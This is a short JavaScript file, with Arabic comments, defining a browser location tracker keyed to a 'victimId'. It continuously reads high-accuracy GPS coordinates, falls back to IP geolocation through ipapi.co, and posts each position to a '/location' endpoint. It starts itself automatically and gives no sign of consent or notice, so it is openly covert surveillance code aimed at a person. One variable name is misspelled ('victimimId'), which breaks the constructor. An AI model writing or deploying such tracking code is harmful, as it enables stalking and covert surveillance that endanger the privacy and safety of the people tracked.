class AdvancedLocationTracker {
    constructor(victimId) {
        this.victimId = victimimId;
        this.locations = [];
        this.watchId = null;
    }

    startTracking() {
        if ("geolocation" in navigator) {
            this.watchId = navigator.geolocation.watchPosition(
                position => this.handlePosition(position),
                error => this.handleError(error),
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            this.getApproximateLocation();
        }
    }

    handlePosition(position) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            timestamp: new Date().toISOString()
        };

        this.locations.push(locationData);
        this.sendLocation(locationData);
    }

    async sendLocation(location) {
        try {
            await fetch('/location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `uid=${encodeURIComponent(this.victimId)}&lat=${encodeURIComponent(location.latitude)}&lon=${encodeURIComponent(location.longitude)}&acc=${encodeURIComponent(location.accuracy)}`
            });
        } catch (error) {
            console.error('Location send failed:', error);
        }
    }

    getApproximateLocation() {
        // استخدام IP للموقع التقريبي
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const approxLocation = {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: 5000, // دقة منخفضة
                    city: data.city,
                    country: data.country_name,
                    source: 'ip_geolocation'
                };
                this.sendLocation(approxLocation);
            });
    }

    handleError(error) {
        console.log('Geolocation error:', error);
        this.getApproximateLocation();
    }
}

// بدء التتبع
const locationTracker = new AdvancedLocationTracker(victimId);
locationTracker.startTracking();
